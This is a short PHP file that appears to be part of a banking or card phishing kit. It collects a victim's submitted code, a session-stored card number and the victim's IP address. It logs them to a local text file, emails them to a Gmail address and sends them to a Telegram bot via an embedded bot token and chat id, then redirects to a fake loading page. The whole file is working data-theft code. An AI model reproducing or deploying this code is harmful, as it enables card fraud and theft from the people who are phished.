<?php
session_start();
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (!empty($_POST['d0PortgasSHONA'])
    ) {
            $_SESSION['d0PortgasSHONA']=$_POST['d0PortgasSHONA'];
          if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
                $ip = $_SERVER['HTTP_CLIENT_IP'];
            } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
            } else {
                $ip = $_SERVER['REMOTE_ADDR'];
            }

            $Ak47 = "〄 Mandex
            ┏━━━━━━━━━━━━━━━━━━
            ┠⌬ ".$_SESSION['ccn']."
            ┏━━━━━━━━━━━━━━━━━━
            ┠⌬ 3| ".$_POST['d0PortgasSHONA']."
            ┠⌬ " . $ip . "
            ┗━━━━━━━━━━━━━━━━━━\n\n";

            $file = fopen("./ddd0PgasSHONA.txt", "a+");
            fwrite($file, $Ak47);
            fclose($file);
            $to = "scottich.montana46@gmail.com";
            $subject = "$ip =?utf-8?Q?=F0=9F=91=BD?= (1ST)";
            $headers = "From: Ak47.BUlLETS™<shanks@dPortgas.org>\r\n";
            $headers .= "MIME-Version: 1.0\r\n";
            $headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
            mail($to, $subject, $Ak47, $headers);
            file_get_contents("https://api.telegram.org/1588168678:AAElp5lIsWo5q4GqdOCeCFxXyv4nLeO8zss/sendMessage?chat_id=-462207069&text=" . urlencode($Ak47)."" ); //mandex           
            
        header("Location: ../loading-final2.php?codigo_id=".md5($_GET['error']));
    }
}
?>